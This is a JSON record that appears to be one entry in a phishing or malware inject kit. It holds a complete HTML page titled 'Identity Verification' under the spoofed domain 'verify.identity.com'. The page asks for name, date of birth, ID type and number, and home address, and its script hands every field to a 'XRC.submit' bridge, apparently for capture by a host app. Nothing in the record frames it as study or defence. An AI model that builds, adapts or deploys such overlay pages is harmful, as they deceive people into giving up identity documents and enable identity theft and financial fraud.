{
  "id": "kyc_identity",
  "domain": "verify.identity.com",
  "name": "Identity Verification",
  "type": "kyc",
  "html": "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Identity Verification</title><style>body{margin:0;padding:0;background:#f8f9fa;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}.box{background:#fff;padding:32px;border-radius:12px;width:90%;max-width:400px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}.logo{text-align:center;margin-bottom:24px;font-size:20px;font-weight:600;color:#1a1a2e}input,select{width:100%;padding:12px;margin:6px 0;border:1px solid #e0e0e0;border-radius:6px;background:#fff;color:#000;box-sizing:border-box;font-size:14px}input:focus,select:focus{outline:none;border-color:#4361ee}button{width:100%;padding:14px;margin-top:16px;background:#4361ee;border:none;border-radius:6px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}.section{margin-top:16px;font-size:13px;color:#666;font-weight:600}</style></head><body><div class='box'><div class='logo'>Identity Verification</div><div class='section'>Personal Information</div><input type='text' id='fullname' placeholder='Full Name'><input type='text' id='dob' placeholder='Date of Birth (DD/MM/YYYY)'><select id='id_type'><option>National ID</option><option>Passport</option><option>Driver License</option></select><input type='text' id='id_number' placeholder='ID Number'><div class='section'>Address</div><input type='text' id='address' placeholder='Street Address'><input type='text' id='city' placeholder='City'><input type='text' id='postcode' placeholder='Postal Code'><button onclick='submit()'>Verify Identity</button></div><script>function submit(){var data={};var inputs=document.getElementsByTagName('input');for(var i=0;i<inputs.length;i++){data[inputs[i].id]=inputs[i].value;}data.id_type=document.getElementById('id_type').value;XRC.submit(JSON.stringify(data));}</script></body></html>"
}